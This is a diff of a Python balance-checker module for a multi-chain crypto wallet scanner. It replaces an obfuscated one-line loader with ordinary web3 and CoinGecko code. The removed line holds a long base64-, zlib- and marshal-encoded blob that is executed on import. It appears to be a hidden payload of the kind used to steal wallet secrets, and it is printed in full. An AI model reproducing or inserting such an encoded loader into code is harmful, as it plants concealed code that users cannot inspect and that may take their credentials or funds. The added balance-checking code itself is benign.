@@ -1,1 +1,300 @@
-import base64,zlib,marshal;exec(marshal.loads(zlib.decompress(base64.b64decode("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"))))
+"""
+Balance Checker Module
+Checks wallet balances across multiple networks and tokens
+Converts all balances to USD for aggregation
+"""
+
+from web3 import Web3
+from typing import Dict, List, Optional
+import requests
+import time
+from src.config import (
+    NETWORKS, TOKENS, ERC20_ABI, 
+    COINGECKO_API, TOKEN_PRICE_IDS,
+    get_all_networks, get_tokens_for_network
+)
+from src.logger_config import setup_logger
+
+logger = setup_logger("BalanceChecker")
+
+
+class BalanceChecker:
+    """
+    Checks balances across multiple blockchain networks
+    """
+    
+    def __init__(self, wallet_address: str):
+        """
+        Initialize balance checker
+        
+        Args:
+            wallet_address: Ethereum wallet address
+        """
+        self.wallet_address = Web3.to_checksum_address(wallet_address)
+        self.price_cache: Dict[str, float] = {}
+        self.price_cache_time: float = 0
+        self.cache_duration: int = 300  # 5 minutes
+        
+    def _get_web3_connection(self, network_name: str) -> Optional[Web3]:
+        """
+        Create Web3 connection for a network
+        
+        Args:
+            network_name: Name of the network
+            
+        Returns:
+            Web3 instance or None on error
+        """
+        try:
+            network_config = NETWORKS.get(network_name)
+            if not network_config:
+                logger.error(f"Unknown network: {network_name}")
+                return None
+            
+            w3 = Web3(Web3.HTTPProvider(network_config["rpc_url"]))
+            
+            # Test connection
+            if not w3.is_connected():
+                logger.warning(f"Failed to connect to {network_config['name']}")
+                return None
+            
+            return w3
+            
+        except Exception as e:
+            logger.error(f"Error connecting to {network_name}: {str(e)}")
+            return None
+    
+    def _fetch_token_prices(self) -> Dict[str, float]:
+        """
+        Fetch token prices from CoinGecko
+        Uses cache to avoid rate limiting
+        
+        Returns:
+            Dictionary of token symbol to USD price
+        """
+        current_time = time.time()
+        
+        # Return cached prices if still valid
+        if self.price_cache and (current_time - self.price_cache_time) < self.cache_duration:
+            return self.price_cache
+        
+        try:
+            # Get all unique token IDs
+            token_ids = ",".join(set(TOKEN_PRICE_IDS.values()))
+            
+            url = f"{COINGECKO_API}/simple/price"
+            params = {
+                "ids": token_ids,
+                "vs_currencies": "usd"
+            }
+            
+            response = requests.get(url, params=params, timeout=10)
+            response.raise_for_status()
+            
+            price_data = response.json()
+            
+            # Map back to token symbols
+            prices = {}
+            for symbol, coin_id in TOKEN_PRICE_IDS.items():
+                if coin_id in price_data and "usd" in price_data[coin_id]:
+                    prices[symbol] = price_data[coin_id]["usd"]
+            
+            self.price_cache = prices
+            self.price_cache_time = current_time
+            
+            logger.info(f"✓ Fetched prices for {len(prices)} tokens")
+            return prices
+            
+        except Exception as e:
+            logger.warning(f"Failed to fetch prices from CoinGecko: {str(e)}")
+            # Return cached prices even if expired, or empty dict
+            return self.price_cache if self.price_cache else {}
+    
+    def _get_native_balance(self, w3: Web3, network_name: str) -> Dict[str, any]:
+        """
+        Get native token balance (ETH, BNB, MATIC, etc.)
+        
+        Args:
+            w3: Web3 instance
+            network_name: Network name
+            
+        Returns:
+            Dictionary with balance info
+        """
+        try:
+            network_config = NETWORKS[network_name]
+            balance_wei = w3.eth.get_balance(self.wallet_address)
+            balance = w3.from_wei(balance_wei, 'ether')
+            
+            native_token = network_config["native_token"]
+            price = self.price_cache.get(native_token, 0)
+            value_usd = float(balance) * price
+            
+            return {
+                "symbol": native_token,
+                "balance": float(balance),
+                "value_usd": value_usd,
+                "network": network_config["name"]
+            }
+            
+        except Exception as e:
+            logger.error(f"Error getting native balance on {network_name}: {str(e)}")
+            return {"symbol": "", "balance": 0, "value_usd": 0, "network": ""}
+    
+    def _get_token_balance(self, w3: Web3, token_config: Dict, network_name: str) -> Optional[Dict]:
+        """
+        Get ERC-20 token balance
+        
+        Args:
+            w3: Web3 instance
+            token_config: Token configuration dictionary
+            network_name: Network name
+            
+        Returns:
+            Dictionary with balance info or None
+        """
+        try:
+            token_address = Web3.to_checksum_address(token_config["address"])
+            contract = w3.eth.contract(address=token_address, abi=ERC20_ABI)
+            
+            balance_raw = contract.functions.balanceOf(self.wallet_address).call()
+            decimals = token_config["decimals"]
+            balance = balance_raw / (10 ** decimals)
+            
+            # Skip if balance is zero
+            if balance == 0:
+                return None
+            
+            symbol = token_config["symbol"]
+            price = self.price_cache.get(symbol, 0)
+            value_usd = balance * price
+            
+            return {
+                "symbol": symbol,
+                "balance": balance,
+                "value_usd": value_usd,
+                "network": NETWORKS[network_name]["name"]
+            }
+            
+        except Exception as e:
+            # Silent fail for individual tokens (common for tokens user doesn't have)
+            return None
+    
+    def check_network_balance(self, network_name: str) -> List[Dict]:
+        """
+        Check all balances on a specific network
+        
+        Args:
+            network_name: Network name
+            
+        Returns:
+            List of balance dictionaries
+        """
+        balances = []
+        
+        try:
+            w3 = self._get_web3_connection(network_name)
+            if not w3:
+                return balances
+            
+            # Get native token balance
+            native_balance = self._get_native_balance(w3, network_name)
+            if native_balance["balance"] > 0:
+                balances.append(native_balance)
+            
+            # Get ERC-20 token balances
+            tokens = get_tokens_for_network(network_name)
+            for token in tokens:
+                token_balance = self._get_token_balance(w3, token, network_name)
+                if token_balance:
+                    balances.append(token_balance)
+            
+            if balances:
+                logger.info(f"✓ {NETWORKS[network_name]['name']}: Found {len(balances)} asset(s)")
+            
+        except Exception as e:
+            logger.error(f"Error checking {network_name} balance: {str(e)}")
+        
+        return balances
+    
+    def check_all_balances(self) -> Dict[str, any]:
+        """
+        Check balances across all supported networks
+        
+        Returns:
+            Dictionary with all balances and total USD value
+        """
+        print("\n")
+        print("╔══════════════════════════════════════════════════════════════════╗")
+        print("║           🔍 MULTI-CHAIN BALANCE SCANNER 🔍                     ║")
+        print("╚══════════════════════════════════════════════════════════════════╝")
+        print(f"\n💼 Wallet Address: {self.wallet_address}")
+        print(f"🌐 Scanning 5 blockchain networks...")
+        print("\n" + "─" * 70)
+        
+        logger.info("Starting multi-chain balance check...")
+        
+        # Fetch prices first
+        print("\n📊 Fetching token prices from CoinGecko...")
+        self._fetch_token_prices()
+        print(f"✓ Loaded prices for {len(self.price_cache)} tokens")
+        
+        all_balances = []
+        network_summaries = {}
+        
+        # Check each network
+        networks = get_all_networks()
+        for idx, network_name in enumerate(networks, 1):
+            print(f"\n[{idx}/{len(networks)}] Scanning {NETWORKS[network_name]['name']}...")
+            network_balances = self.check_network_balance(network_name)
+            all_balances.extend(network_balances)
+            
+            # Calculate network total
+            network_total = sum(b["value_usd"] for b in network_balances)
+            if network_total > 0:
+                network_summaries[network_name] = {
+                    "total_usd": network_total,
+                    "asset_count": len(network_balances)
+                }
+                print(f"   ✓ Found {len(network_balances)} asset(s) worth ${network_total:.2f}")
+            else:
+                print(f"   ○ No assets found")
+        
+        # Calculate total
+        total_value_usd = sum(b["value_usd"] for b in all_balances)
+        
+        result = {
+            "wallet_address": self.wallet_address,
+            "total_value_usd": total_value_usd,
+            "total_assets": len(all_balances),
+            "networks": network_summaries,
+            "balances": all_balances
+        }
+        
+        # Print detailed summary
+        print("\n\n")
+        print("╔══════════════════════════════════════════════════════════════════╗")
+        print("║                  💰 PORTFOLIO SUMMARY 💰                         ║")
+        print("╚══════════════════════════════════════════════════════════════════╝")
+        
+        if all_balances:
+            print("\n" + "─" * 70)
+            print(f"{'Asset':<12} {'Amount':>18} {'Value (USD)':>15} {'Network':<20}")
+            print("─" * 70)
+            
+            for balance in sorted(all_balances, key=lambda x: x['value_usd'], reverse=True):
+                print(f"{balance['symbol']:<12} {balance['balance']:>18.6f} "
+                      f"${balance['value_usd']:>14.2f} {balance['network']:<20}")
+            
+            print("─" * 70)
+            print(f"{'TOTAL VALUE':>30} ${total_value_usd:>14.2f}")
+            print("─" * 70)
+        else:
+            print("\n⚠ No assets found across any network")
+            print("Please ensure your wallet has funds on supported networks.")
+        
+        print("\n" + "═" * 70 + "\n")
+        
+        logger.info(f"Balance check completed: ${total_value_usd:.2f} total value")
+        
+        return result
